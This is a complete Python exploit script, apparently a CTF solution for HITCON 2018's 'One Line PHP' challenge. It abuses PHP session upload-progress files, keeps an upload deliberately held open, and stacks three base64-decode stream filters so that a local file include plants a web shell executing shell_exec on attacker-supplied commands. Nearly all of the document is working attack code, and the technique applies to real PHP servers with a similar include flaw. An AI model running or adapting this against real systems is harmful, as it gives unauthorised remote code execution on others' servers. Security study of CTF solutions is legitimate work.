#!/usr/bin/env python3
"""
11 - One Line PHP  (HITCON CTF 2018, Orange Tsai)

    <?php ($_=@$_GET['orange']) && @substr(file($_)[0],0,6) === '@<?php'
          ? include($_) : highlight_file(__FILE__);

Chain implemented here:

  1. PHP enables the session machinery for a request that never calls
     session_start(), as soon as a multipart/form-data body carries a field
     named PHP_SESSION_UPLOAD_PROGRESS (session.upload_progress.enabled=On).
  2. The progress record is stored in the session file whose path we choose
     ourselves through the PHPSESSID cookie:
         /var/lib/php/sessions/sess_<id>
     and its first bytes are
         upload_progress_<our value>|a:5:{...}
  3. session.upload_progress.cleanup=On deletes the record the moment the
     upload finishes, so we simply never finish it: the POST advertises a
     large Content-Length, we push enough bytes to make PHP flush the
     progress record, and then we hold the socket open.
  4. `upload_progress_` is in the way of the required `@<?php` magic, and no
     stream filter can delete bytes from the front of a stream.  So we let
     convert.base64-decode eat it: the filter silently skips every byte that
     is not in the base64 alphabet and consumes the rest four characters at
     a time.  Three stacked decoders turn the fixed prefix into a short run
     of non-base64 garbage that the next decoder drops for us, and turn our
     value into the literal bytes `@<?php ... ?>`.

Python 3 standard library only.
"""
import base64
import re
import socket
import ssl
import string
import sys
import threading
import time
import urllib.parse
import urllib.request

SESSION_DIR = "/var/lib/php/sessions"
FLAG_RE = re.compile(rb"PHRACK\{[^}]*\}")

B64_ALPHABET = string.ascii_uppercase + string.ascii_lowercase + string.digits + "+/"
B64_REVERSE = {ord(c): i for i, c in enumerate(B64_ALPHABET)}
B64_BYTES = set(B64_ALPHABET.encode())

# The literal prefix PHP puts in front of every upload-progress session entry
# (session.upload_progress.prefix).  Only these characters survive a
# convert.base64-decode pass:  upload_progress_ -> uploadprogress  (14 chars)
UPLOAD_PREFIX = b"upload_progress_"


# --------------------------------------------------------------------------
# A faithful model of ext/standard/filters.c :: php_conv_base64_decode_convert
# --------------------------------------------------------------------------
def php_base64_decode(data: bytes) -> bytes:
    """PHP's convert.base64-decode: skip anything outside the alphabet, stop
    at '=', emit one byte per 6-bit group once 8 bits are available."""
    out = bytearray()
    buf = 0
    pos = 0
    for byte in data:
        if byte == 0x3D:          # '=' terminates the stream
            break
        val = B64_REVERSE.get(byte)
        if val is None:           # invalid character -> silently skipped
            continue
        if pos == 0:
            buf = (val << 2) & 0xFC
        elif pos == 1:
            out.append(buf | (val >> 4))
            buf = (val << 4) & 0xF0
        elif pos == 2:
            out.append(buf | (val >> 2))
            buf = (val << 6) & 0xC0
        else:
            out.append(buf | val)
        pos = (pos + 1) & 3
    return bytes(out)


def b64(data: bytes) -> bytes:
    return base64.b64encode(data)


# --------------------------------------------------------------------------
# Stage 1: find the two padding strings that make the three decoders line up
# --------------------------------------------------------------------------
def find_padding():
    """Return (pad1, pad2).

    After the first decoder the stream is

        G1 || pad2 || base64(base64(payload))

    where G1 = decode("uploadprogress" + pad1).  pad1 has to bring the number
    of base64 characters in front of our data to a multiple of four, so that
    our data is decoded on a group boundary; |pad1| == 2 is the smallest
    choice (14 + 2 = 16).

    The second decoder sees only the base64 characters of G1, so pad2 has to
    top that count up to a multiple of four as well.  The bytes those
    characters decode to, G2, are what the *third* decoder sees in front of
    our payload - and they must therefore contain no base64 character at all,
    otherwise they would shift (and corrupt) the payload.
    """
    prefix_valid = bytes(b for b in UPLOAD_PREFIX if b in B64_BYTES)   # 14
    pool = [bytes([ord(c)]) for c in B64_ALPHABET]
    for a in pool:
        for b in pool:
            pad1 = a + b
            g1 = php_base64_decode(prefix_valid + pad1)
            g1_valid = bytes(x for x in g1 if x in B64_BYTES)
            need = (-len(g1_valid)) % 4
            candidates = [b""] if need == 0 else None
            if candidates is None:
                candidates = pool if need == 1 else [
                    x + y for x in pool for y in pool
                ] if need == 2 else [
                    x + y + z for x in pool for y in pool for z in pool
                ]
            for pad2 in candidates:
                g2 = php_base64_decode(g1_valid + pad2)
                if any(x in B64_BYTES for x in g2):
                    continue
                return pad1, pad2
    raise RuntimeError("no padding found")


# --------------------------------------------------------------------------
# Stage 2: build the value of the PHP_SESSION_UPLOAD_PROGRESS field
# --------------------------------------------------------------------------
# A convert.base64-decode filter that meets a '=' does not just stop: it
# reports a fatal error and the *whole bucket* is thrown away.  The session
# file always ends with PHP's own serialised progress array, which decodes to
# uncontrolled binary - and roughly half the time that binary contains 0x3d.
# Stream filters work on 8 KiB buckets though, and a bucket that fails only
# destroys itself: everything flushed by earlier buckets is already gone
# downstream.  So we inflate the session entry with harmless 'A' filler until
# the serialised tail is pushed into a later bucket than the payload.  'A'
# filler decodes to NUL bytes, which the next decoder skips, so it costs
# nothing.  This is what turns a coin-flip into a deterministic exploit.
BUCKET = 8192
PAD_TO = 2 * BUCKET

def build_progress_value(shell: bytes, pad1: bytes, pad2: bytes):
    """value = pad1 || base64( pad2 || base64( base64( shell ) ) ) || 'A'*n

    '/' filler is appended to the shell until no layer needs '=' padding
    ('=' would make convert.base64-decode bail out) - the filler ends up
    after the closing `?>` where it is only echoed.

    Returns (value, payload, core_len), where core_len is the length of the
    meaningful head of `value`; everything past it is 'A' bucket filler."""
    fill = 0
    while True:
        payload = shell + b"/" * fill
        # base64(base64(payload)) must itself be '='-free:
        #   len(payload) % 3 == 0  and  len(base64(payload)) % 3 == 0
        #   => len(payload) % 9 == 0
        if len(payload) % 9 == 0:
            inner = b64(b64(payload))
            if (len(pad2) + len(inner)) % 3 == 0:
                core = pad1 + b64(pad2 + inner)
                filler = b"A" * (((PAD_TO - len(core) - len(UPLOAD_PREFIX)) // 4) * 4)
                return core + filler, payload, len(core)
        fill += 1


class Decoder:
    """One convert.base64-decode filter, stateful across buckets."""

    def __init__(self):
        self.buf = 0
        self.pos = 0

    def feed(self, data: bytes):
        """Return the decoded bucket, or None when the filter aborts.

        A '=' is *not* a soft stop: php_conv_base64_decode_convert() reports a
        fatal error and strfilter_convert_append_bucket() throws the bucket
        away, so anything this bucket would have produced is lost."""
        out = bytearray()
        for byte in data:
            if byte == 0x3D:
                return None
            val = B64_REVERSE.get(byte)
            if val is None:
                continue
            if self.pos == 0:
                self.buf = (val << 2) & 0xFC
            elif self.pos == 1:
                out.append(self.buf | (val >> 4))
                self.buf = (val << 4) & 0xF0
            elif self.pos == 2:
                out.append(self.buf | (val >> 2))
                self.buf = (val << 6) & 0xC0
            else:
                out.append(self.buf | val)
            self.pos = (self.pos + 1) & 3
        return bytes(out)


def run_chain(data: bytes, depth: int = 3, bucket: int = BUCKET) -> bytes:
    """Model `php://filter/convert.base64-decode|...` over a file stream that
    is read one `bucket` at a time."""
    stages = [Decoder() for _ in range(depth)]
    out = bytearray()
    for off in range(0, len(data), bucket):
        chunk = data[off:off + bucket]
        for stage in stages:
            chunk = stage.feed(chunk)
            if chunk is None:
                return bytes(out)
        out += chunk
    return bytes(out)


def simulate(value: bytes, payload: bytes) -> bool:
    """Decode a realistic session file and check the shell comes out first."""
    tail = (b'|a:5:{s:10:"start_time";i:1700000000;s:14:"content_length";'
            b'i:6291456;s:15:"bytes_processed";i:16600;s:4:"done";b:0;'
            b's:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:1:"f";s:4:"name";'
            b's:5:"a.txt";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;'
            b's:10:"start_time";i:1700000000;s:15:"bytes_processed";i:0;}}}')
    out = run_chain(UPLOAD_PREFIX + value + tail)
    return out.startswith(payload[: payload.index(b"?>") + 2])


# --------------------------------------------------------------------------
# Stage 3: hold an unfinished upload open so the session file stays on disk
# --------------------------------------------------------------------------
class HeldUpload(threading.Thread):
    """POST a multipart body that announces far more data than it delivers.

    session.upload_progress.cleanup=On removes the record when the upload
    *ends*; while the request body is still streaming the record - and the
    session file - stay on disk untouched.  That turns the original race into
    a deterministic window."""

    BOUNDARY = "----------phrack72oneline"
    # The Content-Length we claim.  It has to stay *below* post_max_size (the
    # PHP 7.2 default, 8M): rfc1867_post_handler() bails out before parsing
    # anything when content_length > post_max_size, and then no progress
    # record is ever written.  6 MiB leaves comfortable head-room.
    ANNOUNCED = 6 * 1024 * 1024
    # Bytes of file data we actually push.  session.upload_progress.freq is
    # "1%", i.e. one update per 64512 bytes of body here, so staying under
    # that means PHP writes the record exactly once (at MULTIPART_EVENT_FILE_
    # START) and never touches it again: the window is completely stable.
    PRIMED = 32 * 1024

    def __init__(self, host, port, sid, value, use_tls=False):
        super().__init__(daemon=True)
        self.host, self.port, self.sid, self.value = host, port, sid, value
        self.use_tls = use_tls
        self.ready = threading.Event()
        self.stop = threading.Event()
        self.error = None

    def run(self):
        try:
            head = (
                f"--{self.BOUNDARY}\r\n"
                'Content-Disposition: form-data; '
                'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            ).encode() + self.value + (
                f"\r\n--{self.BOUNDARY}\r\n"
                'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
                "Content-Type: text/plain\r\n\r\n"
            ).encode()
            request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Cookie: PHPSESSID={self.sid}\r\n"
                f"Content-Type: multipart/form-data; boundary={self.BOUNDARY}\r\n"
                f"Content-Length: {self.ANNOUNCED}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()
            sock = socket.create_connection((self.host, self.port), timeout=15)
            if self.use_tls:
                sock = ssl.create_default_context().wrap_socket(
                    sock, server_hostname=self.host)
            with sock:
                sock.sendall(request + head)
                sock.sendall(b"A" * self.PRIMED)
                self.ready.set()
                while not self.stop.wait(0.2):
                    pass
        except Exception as exc:           # noqa: BLE001
            self.error = exc
            self.ready.set()


# --------------------------------------------------------------------------
def include_url(base, sid, command):
    resource = f"{SESSION_DIR}/sess_{sid}"
    chain = "|".join(["convert.base64-decode"] * 3)
    orange = f"php://filter/{chain}/resource={resource}"
    return (base.rstrip("/") + "/?" + urllib.parse.urlencode(
        {"orange": orange, "1": command}))


def fetch(url, timeout=10):
    req = urllib.request.Request(url, headers={"User-Agent": "phrack72"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read()
    except Exception:                      # noqa: BLE001
        return b""


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else "http://challenge"
    parsed = urllib.parse.urlparse(base if "://" in base else "http://" + base)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme == "https"
    command = sys.argv[2] if len(sys.argv) > 2 else "cat /flag.txt"

    print(f"[*] target       {base}")

    pad1, pad2 = find_padding()
    print(f"[*] alignment    pad1={pad1.decode()!r}  pad2={pad2.decode()!r}")

    shell = b'@<?php echo shell_exec($_GET[1]);?>'
    value, payload, core_len = build_progress_value(shell, pad1, pad2)
    print(f"[*] shell        {payload.decode()}")
    # The value is ~16 KiB, almost all of it 'A' bucket filler; print only
    # the head of it and say how much filler follows.
    print(f"[*] progress     {value[:120].decode()}...")
    print(f"[*]              ({len(value)} bytes total: {core_len} bytes of"
          f" payload + {len(value) - core_len} bytes of 'A' bucket filler)")

    if not simulate(value, payload):
        print("[-] offline simulation of the three decoders failed")
        return 1
    print("[+] offline simulation: three decoders reproduce the shell")

    for attempt in range(1, 9):
        sid = "phrack72%02d" % attempt
        upload = HeldUpload(host, port, sid, value, use_tls)
        upload.start()
        upload.ready.wait(10)
        if upload.error:
            print(f"[-] upload thread: {upload.error}")
            return 1
        time.sleep(0.4)                     # let PHP flush the progress record

        url = include_url(base, sid, command)
        print(f"[*] attempt {attempt}: include sess_{sid}")
        body = fetch(url)
        upload.stop.set()
        upload.join(timeout=5)

        match = FLAG_RE.search(body)
        if match:
            print(f"[+] RCE confirmed, `{command}` ran as the web user")
            print("FLAG: " + match.group(0).decode())
            return 0
        if body and b"<?php" not in body:
            print(f"[!] included, unexpected output: {body[:200]!r}")
        time.sleep(0.5)

    print("[-] no flag")
    return 1


if __name__ == "__main__":
    sys.exit(main())
